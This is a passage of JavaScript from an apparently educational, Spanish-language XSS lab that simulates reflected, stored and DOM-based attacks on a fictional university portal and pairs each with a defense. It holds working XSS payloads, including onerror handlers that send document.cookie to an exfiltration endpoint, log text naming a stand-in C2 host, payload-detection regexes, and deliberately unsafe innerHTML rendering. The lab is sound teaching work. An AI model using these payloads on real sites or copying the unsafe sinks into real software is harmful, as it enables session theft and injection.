                    { label: 'aviso urgente (defacement)', val: "Aviso urgente de coordinación: <div style='background:rgba(255,75,92,0.15); border:1px solid #ff4b5c; color:#ffb3ba; padding:6px; border-radius:4px; font-weight:bold; margin-top:4px;'><i class='bi bi-megaphone-fill'></i> CLASE REPROGRAMADA PARA EL SÁBADO</div>" }
                ],
                defenseTitle: 'Mecanismo de Blindaje: XSS Almacenado',
                defenseDesc: 'Requiere defensa en profundidad: 1) Sanitizar datos en la entrada con librerías robustas (Bleach o DOMPurify). 2) Codificar siempre la salida al renderizar HTML. 3) Proteger las cookies de sesión con el atributo <code>HttpOnly</code> para que no puedan ser leídas por scripts inyectados.',
                codeBad: '<div class="mensaje">{% raw %}{{ comentario.mensaje|safe }}{% endraw %}</div>',
                codeGood: '<div class="mensaje">{% raw %}{{ comentario.mensaje }}{% endraw %}</div> <!-- Jinja autoescape -->'
            },
            dom: {
                nombre: 'XSS Basado en DOM (Tipo 0)',
                prefixLabel: '#',
                hint: 'Vulnerabilidad 100% en Cliente',
                craftLabel: '<i class="bi bi-hash text-danger"></i> Enlace trampa con Fragmento # (Ciego al Servidor):',
                btnText: '🔗 Víctima abre URL con #hash (Normal)',
                btnDebugText: '🐞 Abrir y Depurar DOM',
                desc: '<strong>¡Ciego al servidor!</strong> El script malicioso viaja tras el fragmento <code>#</code>. Los navegadores <strong>nunca envían el fragmento # en la petición HTTP</strong> al servidor. La vulnerabilidad ocurre enteramente en el cliente cuando el JS lee una fuente (source) insegura y la escribe en un sumidero (sink) como <code>innerHTML</code>.',
                urlBase: 'https://portal.unicaes.edu/perfil#',
                defaultPayload: "<img src=x onerror=\"fetch('/api/exfiltrar?vector=DOM_XSS&datos='+document.cookie); alert('DOM_XSS_Ejecutado')\">",
                chips: [
                    { label: 'nombre normal', val: 'Ana Villeda' },
                    { label: 'negrita HTML', val: '<b>Ana (Admin)</b>' },
                    { label: 'alerta DOM', val: "<img src=x onerror=alert('DOM_XSS_innerHTML')>" },
                    { label: 'robo cookie DOM', val: "<img src=x onerror=\"fetch('/api/exfiltrar?vector=DOM_XSS&datos='+document.cookie)\">" }
                ],
                defenseTitle: 'Mecanismo de Blindaje: XSS en DOM',
                defenseDesc: 'Para blindar XSS en el DOM, los desarrolladores front-end deben <strong>evitar sumideros (sinks) peligrosos</strong> como <code>innerHTML</code>, <code>outerHTML</code> o <code>document.write()</code> con datos no confiables. Se debe usar APIs seguras como <code>textContent</code> o <code>innerText</code>, o sanitizar con <code>DOMPurify.sanitize()</code>.',
                codeBad: 'document.getElementById("saludo").innerHTML = location.hash.slice(1);',
                codeGood: 'document.getElementById("saludo").textContent = decodeURIComponent(location.hash.slice(1));'
            }
        };

        // Cambiar entre pestañas de vectores
        function cambiarVector(vector) {
            vectorActual = vector;
            try { sessionStorage.setItem('xss_vector_activo', vector); } catch(e){}
            resetearDebuggerUI();

            // Actualizar botones de pestaña
            document.querySelectorAll('.vector-tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-btn-' + vector).classList.add('active');

            const cfg = VECTORES_CONFIG[vector];
            document.getElementById('input-prefix-label').innerText = cfg.prefixLabel;
            document.getElementById('vector-hint-badge').innerText = cfg.hint;
            document.getElementById('vector-explanation-text').innerHTML = cfg.desc;
            document.getElementById('craft-preview-label').innerHTML = cfg.craftLabel;
            document.getElementById('btn-victim-action').innerText = cfg.btnText;
            document.getElementById('btn-debug-action').innerText = cfg.btnDebugText;
            document.getElementById('payload-input').value = cfg.defaultPayload;

            // Cargar chips de prueba
            const chipsBox = document.getElementById('chips-container');
            chipsBox.innerHTML = '';
            cfg.chips.forEach(c => {
                const el = document.createElement('span');
                el.className = 'chip';
                el.innerHTML = `<i class="bi bi-code"></i> ${c.label}`;
                el.onclick = () => {
                    document.getElementById('payload-input').value = c.val;
                    actualizarUrlPreview();
                };
                chipsBox.appendChild(el);
            });

            // Actualizar tarjeta de blindaje
            document.getElementById('defense-title').innerText = cfg.defenseTitle;
            document.getElementById('defense-desc').innerHTML = cfg.defenseDesc;
            document.getElementById('code-snippet-bad').innerText = cfg.codeBad;
            document.getElementById('code-snippet-good').innerText = cfg.codeGood;

            actualizarUrlPreview();
            renderizarVistaVictimaInicial();
        }

        // Clasificador Inteligente de la Entrada
        function clasificarPayload(p) {
            if (!p) p = '';
            const tieneHtml = /<\/?[a-z][\s\S]*>/i.test(p);
            const tieneScript = /<script|onerror|onload|javascript:|eval\(|<iframe/i.test(p);
            const robaCookie = /cookie/i.test(p) || p.includes('exfiltrar');
            const tieneAlerta = /alert\(/i.test(p);

            if (tieneScript && robaCookie) {
                return {
                    tipo: 'ROBO_COOKIE',
                    etiqueta: 'XSS Exfiltrador (Robo de Cookie / C2)',
                    badgeClass: 'text-danger fw-bold',
                    esPeligroso: true
                };
            } else if (tieneScript || tieneAlerta) {
                return {
                    tipo: 'XSS_POC',
                    etiqueta: 'XSS PoC (Ejecución de Script / Alerta)',
                    badgeClass: 'text-warning fw-bold',
                    esPeligroso: true
                };
            } else if (tieneHtml) {
                return {
                    tipo: 'HTML_INYECCION',
                    etiqueta: 'Inyección HTML (Alteración Visual / Defacement)',
                    badgeClass: 'text-info fw-bold',
                    esPeligroso: false
                };
            } else {
                return {
                    tipo: 'TEXTO_NORMAL',
                    etiqueta: 'Texto Legítimo Inocuo (Sin Inyección)',
                    badgeClass: 'text-success fw-bold',
                    esPeligroso: false
                };
            }
        }

        // Actualizar la vista previa de la URL trampa o del comentario a publicar
        function actualizarUrlPreview() {
            const val = document.getElementById('payload-input').value;
            const cfg = VECTORES_CONFIG[vectorActual];
            const display = document.getElementById('url-preview-display');
            const craftWrapper = document.getElementById('url-craft-wrapper');
            const craftLabel = document.getElementById('craft-preview-label');
            const info = clasificarPayload(val);

            if (craftLabel) {
                craftLabel.innerHTML = cfg.craftLabel;
            }

            if (vectorActual === 'stored') {
                craftWrapper.style.display = 'block';
                const textoVisible = val.replace(/<[^>]*>/g, '').trim();
                const partesTags = val.match(/<[^>]+>[\s\S]*?<\/[^>]+>|<[^>]+\/?>/gi) || [];
                const codigoInyectado = partesTags.join(' ');

                display.innerHTML = `
                    <div class="p-2 border rounded" style="background:#081324; border-color:var(--amber);">
                        <div class="d-flex justify-content-between align-items-center mb-1">
                            <strong style="color:var(--amber); font-size:11.5px;">
                                <i class="bi bi-incognito"></i> n0cturno (Atacante)
                            </strong>
                            <span class="badge ${info.esPeligroso ? 'bg-danger' : (info.tipo === 'HTML_INYECCION' ? 'bg-warning text-dark' : 'bg-success')}" style="font-size:9.5px;">
                                ${info.etiqueta}
                            </span>
                        </div>
                        <div class="mono small text-light mb-1" style="word-break:break-all; font-size:12px;">
                            ${escapeHtml(val)}
                        </div>
                        ${textoVisible && codigoInyectado ? `
                        <div class="p-1 mb-1 rounded bg-dark border border-secondary" style="font-size:11px;">
                            <span class="text-muted"><i class="bi bi-eye"></i> Lo que leerán los estudiantes:</span> 
                            <span class="text-light fw-medium">"${escapeHtml(textoVisible)}"</span> 
                            <span class="text-danger ms-1">(+ script invisible camuflado)</span>
                        </div>` : ''}
                        <div class="text-secondary border-top border-dark pt-1 d-flex justify-content-between align-items-center" style="font-size:10px;">
                            <span><i class="bi bi-database-fill-up text-warning"></i> Se guardará en: <code>comentarios_db</code></span>
                            <span class="text-info"><i class="bi bi-broadcast"></i> Afectará a todo visitante del foro</span>
                        </div>
                    </div>
                `;
            } else if (vectorActual === 'reflected') {
                craftWrapper.style.display = 'block';
                display.innerHTML = `https://portal.unicaes.edu/buscar?q=<span class="param-highlight">${escapeHtml(encodeURIComponent(val))}</span> <span class="${info.badgeClass} ms-1" style="font-size:10px;">[${info.etiqueta}]</span>`;
            } else if (vectorActual === 'dom') {
                craftWrapper.style.display = 'block';
                display.innerHTML = `https://portal.unicaes.edu/perfil#<span class="hash-highlight">${escapeHtml(val)}</span> <span class="badge bg-danger ms-1" style="font-size:9px;"># Ciego al Servidor</span> <span class="${info.badgeClass} ms-1" style="font-size:10px;">[${info.etiqueta}]</span>`;
            }

            if (pasoActual === 0) {
                document.getElementById('var-payload').innerText = val ? val : 'Ninguno en ejecución';
                document.getElementById('var-clasificacion').innerHTML = `<span class="${info.badgeClass}">${info.etiqueta}</span>`;
            }
        }

        // Renderizar el navegador de la víctima al iniciar o cambiar pestaña
        function renderizarVistaVictimaInicial() {
            const cont = document.getElementById('victim-browser-content');
            const urlBar = document.getElementById('victim-browser-url');

            if (vectorActual === 'reflected') {
                urlBar.innerText = 'https://portal.unicaes.edu/buscar';
                cont.innerHTML = `
                    <div class="p-3">
                        <h5 class="text-dark fw-bold mb-2"><i class="bi bi-search text-primary"></i> Buscador de Recursos Académicos</h5>
                        <p class="text-secondary small mb-3">Ingresa un término de búsqueda para consultar libros y guías de cátedra.</p>
                        <div class="p-2 border rounded bg-light text-muted small" id="resultados-busqueda-box">
                            Esperando consulta o simulación de enlace trampa...
                        </div>
                    </div>
                `;
            } else if (vectorActual === 'stored') {
                urlBar.innerText = 'https://portal.unicaes.edu/tablon-comentarios';
                cargarComentariosServidor();
            } else if (vectorActual === 'dom') {
                urlBar.innerText = 'https://portal.unicaes.edu/perfil';
                cont.innerHTML = `
                    <div class="p-3">
                        <div class="d-flex align-items-center gap-3 mb-3">
                            <div class="bg-primary text-white rounded-circle d-flex align-items-center justify-content-center" style="width:48px; height:48px; font-size:20px; font-weight:bold;">
                                AV
                            </div>
                            <div>
                                <h5 class="text-dark fw-bold mb-0" id="dom-saludo-header">¡Bienvenida al Portal Estudiantil!</h5>
                                <span class="text-muted small">Alumna: Ana Villeda · Carnet: U20230145</span>
                            </div>
                        </div>
                        <div class="alert alert-info py-2 px-3 small">
                            <i class="bi bi-info-circle"></i> Esta página utiliza un script del lado del cliente que saluda dinámicamente extrayendo el nombre del fragmento <code>location.hash</code>.
                        </div>
                        <div class="border rounded p-2 bg-light text-dark small" id="dom-render-target">
                            Esperando lectura de location.hash...
                        </div>
                    </div>
                `;
            }
        }

        // ==============================================================
        // EJECUCIÓN DEL ATAQUE Y SINCRONIZACIÓN DE ESTADOS
        // ==============================================================

        let infoPayloadActual = null;

        function ejecutarAtaque(conDebug) {
            const payload = document.getElementById('payload-input').value.trim();
            if (!payload) return;

            const info = clasificarPayload(payload);
            infoPayloadActual = info;

            const accionFinal = (esMitigado) => {
                if (vectorActual === 'reflected') {
                    ejecutarReflejadoEnVictima(payload, esMitigado, info);
                } else if (vectorActual === 'stored') {
                    ejecutarAlmacenadoEnVictima(payload, esMitigado, info);
                } else if (vectorActual === 'dom') {
                    ejecutarDomEnVictima(payload, esMitigado, info);
                }
            };

            if (conDebug) {
                iniciarDebug(VECTORES_CONFIG[vectorActual].nombre, payload, accionFinal);
            } else {
                // Ejecución directa en navegador de la víctima
                accionFinal(MODO_SEGURO);

                // Sincronizar el panel del debugger con el resultado real
                sincronizarDebuggerEjecucionNormal(payload, info, MODO_SEGURO);

                // SOLO exfiltrar al C2 si es un payload de robo de cookies Y en modo vulnerable
                if (!MODO_SEGURO && info.tipo === 'ROBO_COOKIE') {
                    exfiltrarAlC2(VECTORES_CONFIG[vectorActual].nombre);
                }
            }
        }

        // Sincronización cuando se pulsa el botón normal (sin pausas de F10)
        function sincronizarDebuggerEjecucionNormal(payload, info, esMitigado) {
            detenerAuto();
            document.getElementById('var-payload').innerText = payload;
            document.getElementById('var-clasificacion').innerHTML = `<span class="${info.badgeClass}">${info.etiqueta}</span>`;
            document.getElementById('debug-step-badge').innerText = 'Ejecución Directa';

            for (let i = 1; i <= 3; i++) {
                document.getElementById('arr-' + i).className = 'pipeline-arrow arrow-passed';
            }

            if (info.tipo === 'TEXTO_NORMAL') {
                setStepStyle(1, 'step-blocked', 'Texto Normal');
                setStepStyle(2, 'step-blocked', vectorActual === 'dom' ? 'Bypass HTTP' : 'Procesado');
                setStepStyle(3, 'step-blocked', 'Render Limpio');
                setStepStyle(4, 'step-blocked', 'Sin Riesgo');
                document.getElementById('var-impacto').innerHTML = '<span class="text-success fw-bold">Inocuo (Tráfico Legítimo)</span>';
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-success fw-bold"><i class="bi bi-check-circle-fill"></i> Consulta normal completada:</span> Entrada legítima procesada como texto plano sin incidentes de seguridad. La terminal C2 permanece inactiva.';
            } else if (esMitigado) {
                setStepStyle(1, 'step-paused', 'Carga Neutralizada');
                setStepStyle(2, 'step-blocked', 'html.escape() Bloqueó');
                setStepStyle(3, 'step-blocked', 'Texto Seguro');
                setStepStyle(4, 'step-blocked', 'Ataque Neutralizado');
                document.getElementById('var-impacto').innerHTML = '<span class="text-success fw-bold">Protegido por Defensas</span>';
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-success fw-bold"><i class="bi bi-shield-check"></i> Ataque contenido:</span> Las defensas activas codificaron la entrada. Nada se ejecutó en el cliente.';
            } else if (info.tipo === 'HTML_INYECCION') {
                setStepStyle(1, 'step-bypassed', 'HTML Tag');
                setStepStyle(2, 'step-bypassed', 'Emitido Raw');
                setStepStyle(3, 'step-bypassed', 'Formato Renderizado');
                setStepStyle(4, 'step-bypassed', 'Impacto Visual');
                document.getElementById('var-impacto').innerHTML = '<span class="text-warning fw-bold">Inyección HTML (Defacement)</span>';
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-warning fw-bold"><i class="bi bi-palette"></i> Inyección HTML:</span> Etiquetas interpretadas por el navegador (alteración visual). No se ejecutó JavaScript.';
            } else if (info.tipo === 'XSS_POC') {
                setStepStyle(1, 'step-vuln', 'Script Inyectado');
                setStepStyle(2, vectorActual === 'dom' ? 'step-bypassed' : 'step-vuln', vectorActual === 'dom' ? 'Bypass HTTP' : 'Emitido Raw');
                setStepStyle(3, 'step-vuln', 'Script Ejecutado');
                setStepStyle(4, 'step-bypassed', 'Alerta Disparada');
                document.getElementById('var-impacto').innerHTML = '<span class="text-danger fw-bold">XSS PoC (Alerta Ejecutada)</span>';
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-danger fw-bold"><i class="bi bi-exclamation-triangle-fill"></i> Vulnerable:</span> Script ejecutado en el contexto de Ana (alerta disparada). Sin exfiltración al C2.';
            } else if (info.tipo === 'ROBO_COOKIE') {
                setStepStyle(1, 'step-vuln', 'Exfiltrador Inyectado');
                setStepStyle(2, vectorActual === 'dom' ? 'step-bypassed' : 'step-vuln', vectorActual === 'dom' ? 'Bypass HTTP' : 'Emitido Raw');
                setStepStyle(3, 'step-vuln', 'document.cookie leído');
                setStepStyle(4, 'step-vuln', 'Exfiltrado al C2');
                document.getElementById('var-impacto').innerHTML = '<span class="text-danger fw-bold">¡COMPROMISO CRÍTICO!</span>';
                document.getElementById('debug-log-msg').innerHTML = '<span class="text-danger fw-bold"><i class="bi bi-skull"></i> ¡Compromiso Total!:</span> Token de sesión exfiltrado a malo.com/c2.';
            }

            document.getElementById('btn-next-step').disabled = true;
            document.getElementById('btn-auto').disabled = true;
        }

        // 1. Reflejado en Navegador Víctima
        function ejecutarReflejadoEnVictima(payload, esMitigado, info) {
            const urlBar = document.getElementById('victim-browser-url');
            urlBar.innerText = 'https://portal.unicaes.edu/buscar?q=' + encodeURIComponent(payload);

            const resBox = document.getElementById('resultados-busqueda-box');
            if (esMitigado) {
                resBox.innerHTML = `Resultados para: <strong>${escapeHtml(payload)}</strong> <span class="badge bg-success ms-2">Neutralizado como texto plano</span>`;
            } else if (info && info.tipo === 'TEXTO_NORMAL') {
                resBox.innerHTML = `Resultados para: <strong>${escapeHtml(payload)}</strong>`;
            } else {
                const textoVisible = payload.replace(/<[^>]*>/g, '').trim();
                let renderVal = payload;
                if (!textoVisible) {
                    renderVal = `<span class="text-secondary fst-italic small"><i class="bi bi-eye-slash-fill text-warning"></i> (Payload sin texto visible: <code class="text-danger">${escapeHtml(payload)}</code>)</span>` + payload;
                }
                resBox.innerHTML = `Resultados para: <strong>${renderVal}</strong>`;
                evaluarScriptsInyectados(resBox);
                mostrarAlertaSimulada(payload);
            }
        }

        // 2. Almacenado en Navegador Víctima
        function ejecutarAlmacenadoEnVictima(payload, esMitigado, info) {
            const autor = (info && (info.esPeligroso || info.tipo === 'HTML_INYECCION')) ? 'n0cturno (Atacante)' : 'Ana Villeda (Estudiante)';
            fetch('/api/comentario', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ autor: autor, mensaje: payload })
            })
            .then(r => r.json())
            .then(data => {
                recargarComentariosEnDOM(data.comentarios);
                if (!esMitigado && info && info.esPeligroso) {
                    mostrarAlertaSimulada(payload);
                }
            });
        }

        function cargarComentariosServidor() {
            fetch('/api/logs').then(() => {
                const cont = document.getElementById('victim-browser-content');
                cont.innerHTML = `
                    <div class="p-2">
                        <div class="d-flex justify-content-between align-items-center mb-2">
                            <h6 class="text-dark fw-bold mb-0"><i class="bi bi-chat-dots-fill text-primary"></i> Foro de Dudas - Tarea 3</h6>
                            <button class="btn btn-sm btn-outline-secondary py-0" onclick="resetearTablonServidor()"><i class="bi bi-trash"></i> Reset Tablón</button>
                        </div>
                        <div id="lista-comentarios-box" style="max-height: 180px; overflow-y: auto;">
                            <!-- Comentarios -->
                        </div>
                    </div>
                `;
                fetch('/api/comentario', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ autor: '', mensaje: '' }) })
                    .then(r => r.json())
                    .then(data => recargarComentariosEnDOM(data.comentarios));
            });
        }

        function recargarComentariosEnDOM(comentarios) {
            const box = document.getElementById('lista-comentarios-box');
            if (!box) return;
            let htmlStr = '';
            let comentarioPeligrosoDetectado = null;
            let infoPeligrosoDetectado = null;

            comentarios.slice().reverse().forEach((c, idx) => {
                const esAtacante = c.autor.includes('n0cturno');
                const badge = c.seguro 
                    ? '<span class="badge bg-success" style="font-size:9px;">Sanitizado</span>' 
                    : '<span class="badge bg-danger" style="font-size:9px;">Raw HTML</span>';
                
                // Normalizar posibles backslashes antes de procesar
                const mensajeNormalizado = c.mensaje.replace(/<\\\/script>/gi, '</' + 'script>');
                const textoVisible = mensajeNormalizado.replace(/<[^>]*>/g, '').trim();
                const tieneScript = /<script|onerror|onload|javascript:|eval\(|<iframe/i.test(mensajeNormalizado);
                const partesTags = mensajeNormalizado.match(/<[^>]+>[\s\S]*?<\/[^>]+>|<[^>]+\/?>/gi) || [];
                const codigoInyectado = partesTags.join(' ');

                let msgBody = '';
                if (MODO_SEGURO) {
                    msgBody = c.seguro ? mensajeNormalizado : escapeHtml(mensajeNormalizado);
                } else {
                    if (esAtacante && !textoVisible) {
                        msgBody = `<span class="text-secondary fst-italic small"><i class="bi bi-eye-slash-fill text-warning"></i> (Comentario con carga sin texto visible: <code class="text-danger">${escapeHtml(mensajeNormalizado)}</code>)</span>` + mensajeNormalizado;
                    } else {
                        msgBody = mensajeNormalizado;
                    }
                }

                const cardStyle = esAtacante 
                    ? 'border-left: 4px solid var(--red); background: rgba(255, 92, 108, 0.08);' 
                    : 'border-left: 4px solid var(--turq); background: rgba(25, 211, 197, 0.04);';
                
                const infoCom = clasificarPayload(mensajeNormalizado);
                if (!MODO_SEGURO && esAtacante && !c.seguro && infoCom.esPeligroso) {
                    // Priorizar ROBO_COOKIE si existen varios comentarios maliciosos
                    if (!comentarioPeligrosoDetectado || infoCom.tipo === 'ROBO_COOKIE') {
                        comentarioPeligrosoDetectado = Object.assign({}, c, { mensaje: mensajeNormalizado });
                        infoPeligrosoDetectado = infoCom;
                    }
                }

                htmlStr += `
                    <div class="border-bottom py-2 px-2 my-1 rounded small" style="${cardStyle}">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <strong class="${esAtacante ? 'text-danger' : 'text-primary'}">
                                    <i class="bi ${esAtacante ? 'bi-incognito' : 'bi-person-circle'}"></i> ${escapeHtml(c.autor)}
                                </strong>
                                ${esAtacante ? '<span class="badge bg-danger ms-1" style="font-size:8.5px;">INYECTADO EN BD</span>' : ''}
                            </div>
                            <div>${badge} <small class="text-muted ms-1">${c.fecha}</small></div>
                        </div>
                        <div class="text-dark mt-1 mensaje-cuerpo fw-medium">${msgBody}</div>
                        ${!MODO_SEGURO && esAtacante && textoVisible && tieneScript ? `
                        <div class="mt-1 pt-1 border-top border-danger border-opacity-25 d-flex align-items-center gap-1 text-danger" style="font-size:9.5px;">
                            <i class="bi bi-bug-fill"></i> <span>Payload inyectado camuflado:</span> <code class="text-danger" style="font-size:9px;">${escapeHtml(codigoInyectado || mensajeNormalizado)}</code>
                        </div>` : ''}
                    </div>
                `;
            });
            box.innerHTML = htmlStr;

            if (!MODO_SEGURO) {
                evaluarScriptsInyectados(box);

                // Si al recargar o volver a la pestaña hay un comentario persistente malicioso:
                if (comentarioPeligrosoDetectado) {
                    mostrarAlertaSimulada(comentarioPeligrosoDetectado.mensaje);
                    
                    setStepStyle(1, 'step-vuln', 'Persistente en BD');
                    setStepStyle(2, 'step-vuln', 'Servido por Backend');
                    setStepStyle(3, 'step-vuln', 'DOM Ejecuta Script');

                    if (infoPeligrosoDetectado.tipo === 'ROBO_COOKIE') {
                        exfiltrarAlC2('XSS Almacenado Persistente (Al Cargar Foro)');
                        setStepStyle(4, 'step-vuln', 'Exfiltrado al C2');
                        document.getElementById('var-impacto').innerHTML = '<span class="text-danger fw-bold">¡COMPROMISO PASIVO!</span>';
                        document.getElementById('debug-log-msg').innerHTML = '<span class="text-danger fw-bold"><i class="bi bi-radioactive"></i> [XSS ALMACENADO PERSISTENTE]:</span> El navegador de Ana abrió el foro y ejecutó automáticamente el script de robo de sesión almacenado en la base de datos sin necesidad de hacer clic. Token exfiltrado a malo.com/c2.';
                    } else {
                        setStepStyle(4, 'step-neutral', 'Sin Exfiltración C2');
                        document.getElementById('var-impacto').innerHTML = '<span class="text-warning fw-bold">EJECUCIÓN DE SCRIPT EN DOM</span>';
                        document.getElementById('debug-log-msg').innerHTML = '<span class="text-warning fw-bold"><i class="bi bi-exclamation-triangle-fill"></i> [XSS ALMACENADO PERSISTENTE]:</span> El navegador abrió el foro y ejecutó automáticamente la alerta PoC almacenada en la base de datos.';
                    }

                    document.getElementById('var-payload').innerText = comentarioPeligrosoDetectado.mensaje;
                    document.getElementById('var-clasificacion').innerHTML = `<span class="${infoPeligrosoDetectado.badgeClass}">${infoPeligrosoDetectado.etiqueta}</span>`;
                }
            }
        }

        function resetearTablonServidor() {
            fetch('/api/reset-comentarios', { method: 'POST' })
                .then(r => r.json())
                .then(data => recargarComentariosEnDOM(data.comentarios));
        }

        // 3. DOM en Navegador Víctima
        function ejecutarDomEnVictima(payload, esMitigado, info) {
            const urlBar = document.getElementById('victim-browser-url');
            urlBar.innerText = 'https://portal.unicaes.edu/perfil#' + payload;

            const header = document.getElementById('dom-saludo-header');
            const target = document.getElementById('dom-render-target');

            if (esMitigado) {
                header.textContent = "¡Bienvenida, " + payload + "!";
                target.textContent = "Texto procesado de forma segura con textContent: " + payload;
            } else if (info && info.tipo === 'TEXTO_NORMAL') {
                header.textContent = "¡Bienvenida, " + payload + "!";
                target.textContent = "Perfil cargado con el nombre: " + payload;
            } else {
                const textoVisible = payload.replace(/<[^>]*>/g, '').trim();
                let renderVal = payload;
                if (!textoVisible) {
                    renderVal = `<span class="text-secondary fst-italic small"><i class="bi bi-eye-slash-fill text-warning"></i> (Carga sin texto visible: <code class="text-danger">${escapeHtml(payload)}</code>)</span>` + payload;
                }
                header.innerHTML = "¡Bienvenida, " + (textoVisible ? payload : renderVal) + "!";
                target.innerHTML = "Contenido inyectado con innerHTML: " + renderVal;
                evaluarScriptsInyectados(header);
                evaluarScriptsInyectados(target);
                mostrarAlertaSimulada(payload);
            }
        }

        function evaluarScriptsInyectados(contenedor) {
            const scripts = contenedor.querySelectorAll('script');
            scripts.forEach(s => {
                const nuevo = document.createElement('script');
                nuevo.textContent = s.textContent;
                document.body.appendChild(nuevo);
            });
        }

        // Mostrar popup simulado estilo alerta de navegador sólo si corresponde a alerta real
        function mostrarAlertaSimulada(payload) {
            const info = clasificarPayload(payload);
            if (!info.esPeligroso) return;

            const m = payload.match(/alert\(\s*['"]?([^'")]*)/i);
            const alertaMsg = m ? m[1] : (payload.includes('cookie') ? 'document.cookie exfiltrado con éxito' : null);
            if (!alertaMsg) return;

            const cont = document.getElementById('victim-browser-content');
            cont.querySelectorAll('.simulated-alert-overlay').forEach(o => o.remove());

            const overlay = document.createElement('div');
            overlay.className = 'simulated-alert-overlay';
            overlay.innerHTML = `
                <div class="simulated-alert-box">
                    <div class="d-flex align-items-center gap-2 mb-2">
                        <i class="bi bi-exclamation-triangle-fill text-warning fs-5"></i>
                        <strong class="text-dark small">portal.unicaes.edu dice:</strong>
                    </div>
                    <div class="text-secondary small mb-3 mono">${escapeHtml(alertaMsg)}</div>
                    <div class="text-end">
                        <button class="btn btn-sm btn-turq py-1 px-3" onclick="this.closest('.simulated-alert-overlay').remove()">Aceptar</button>
                    </div>
                </div>
            `;
            cont.appendChild(overlay);
        }

        // ==============================================================
        // PIPELINE DEBUGGER PASO A PASO
        // ==============================================================

        function iniciarDebug(vector, payload, callback) {
            resetearDebuggerUI();
            payloadEnEjecucion = payload;
            callbackExito = callback;
            infoPayloadActual = clasificarPayload(payload);

            document.getElementById('var-payload').innerText = payload;
            document.getElementById('var-clasificacion').innerHTML = `<span class="${infoPayloadActual.badgeClass}">${infoPayloadActual.etiqueta}</span>`;
            document.getElementById('var-impacto').innerText = 'Auditoría en curso...';

            document.getElementById('btn-next-step').disabled = false;
            document.getElementById('btn-auto').disabled = false;
            avanzarStepDebugger();
        }

        function avanzarStepDebugger() {
            if (pasoActual >= 4) {
                document.getElementById('btn-next-step').disabled = true;
                detenerAuto();
                return;
            }

            pasoActual++;
            document.getElementById('debug-step-badge').innerText = 'Paso ' + pasoActual + ' / 4';

            const info = infoPayloadActual || clasificarPayload(payloadEnEjecucion);

            if (pasoActual === 1) {
                // PASO 1: SOURCE (Entrada / URL)
                if (info.tipo === 'TEXTO_NORMAL') {
                    setStepStyle(1, 'step-paused', 'Entrada Legítima');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-info fw-bold">[PASO 1 - SOURCE / ENTRADA]:</span> Capturado: <code>${escapeHtml(payloadEnEjecucion)}</code>. Es texto plano legítimo sin etiquetas ni scripts. Pulsa F10 o "Paso" para auditar el backend.
                    `;
                } else if (info.tipo === 'HTML_INYECCION') {
                    setStepStyle(1, 'step-paused', 'Etiquetas HTML');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-warning fw-bold">[PASO 1 - SOURCE / ENTRADA]:</span> Etiquetas de formato HTML detectadas: <code>${escapeHtml(payloadEnEjecucion)}</code>. Pulsa F10 para auditar el backend.
                    `;
                } else {
                    setStepStyle(1, 'step-paused', 'Carga Maliciosa');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-danger fw-bold">[PASO 1 - SOURCE / ENTRADA]:</span> Carga ejecutable detectada: <code>${escapeHtml(payloadEnEjecucion.substring(0, 36))}...</code>. Pulsa F10 para auditar el backend.
                    `;
                }
            } 
            else if (pasoActual === 2) {
                // PASO 2: BACKEND (Servidor o Bypass)
                document.getElementById('arr-1').className = 'pipeline-arrow arrow-passed';
                setStepStyle(1, info.esPeligroso ? 'step-vuln' : (info.tipo === 'HTML_INYECCION' ? 'step-bypassed' : 'step-blocked'), 'Capturado');

                if (vectorActual === 'dom') {
                    // DOM: OMITIDO / BYPASS TOTAL
                    setStepStyle(2, 'step-bypassed', 'Bypass HTTP (#)');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-warning fw-bold"><i class="bi bi-info-circle"></i> [PASO 2 - DOM XSS]:</span> <strong>¡El backend es completamente omitido!</strong> Lo que va tras el símbolo <code>#</code> jamás viaja en la petición HTTP al servidor. La petición llegó limpia. Pulsa F10 para ver el render en cliente.
                    `;
                } else if (MODO_SEGURO) {
                    // MITIGADO EN BACKEND
                    setStepStyle(2, 'step-blocked', 'html.escape() Bloqueó');
                    document.getElementById('var-impacto').innerHTML = '<span class="text-success fw-bold">Neutralizado en Servidor</span>';
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-success fw-bold"><i class="bi bi-shield-check"></i> [PASO 2 - MITIGADO]:</span> El servidor ejecutó <code>html.escape()</code>. Los caracteres &lt; y &gt; se convirtieron en texto plano inocuo. El ataque finalizó aquí de forma segura.
                    `;
                    if (callbackExito) callbackExito(true);
                    detenerAuto();
                    document.getElementById('btn-next-step').disabled = true;
                    return;
                } else if (info.tipo === 'TEXTO_NORMAL') {
                    setStepStyle(2, 'step-blocked', 'Texto Limpio');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-info fw-bold"><i class="bi bi-check2-circle"></i> [PASO 2 - BACKEND]:</span> El servidor procesó la entrada. Al ser texto simple legítimo, no representa amenaza de inyección. Pulsa F10 para el render en el navegador.
                    `;
                } else {
                    // VULNERABLE EN BACKEND
                    setStepStyle(2, 'step-vuln', 'Concatenado sin Escapar');
                    document.getElementById('debug-log-msg').innerHTML = `
                        <span class="text-danger fw-bold"><i class="bi bi-exclamation-triangle"></i> [PASO 2 - VULNERABLE]:</span> El servidor incrustó la carga en bruto en el HTML sin neutralizarla. Pulsa F10 para ver cómo lo interpreta el DOM del cliente.
                    `;
                }
            }
            else if (pasoActual === 3) {
                // PASO 3: PARSER DOM CLIENTE
                document.getElementById('arr-2').className = 'pipeline-arrow arrow-passed';

                // RENDERIZAR EN EL NAVEGADOR DE LA VÍCTIMA EN ESTE PASO
                if (callbackExito) {
                    callbackExito(MODO_SEGURO);
                }

                if (vectorActual === 'dom' && MODO_SEGURO) {
                    setStepStyle(3, 'step-blocked', 'textContent Seguro');
                    document.getElementById('var-impacto').innerHTML = '<span class="text-success fw-bold">Sink Seguro (Sin Ejecución)</span>';
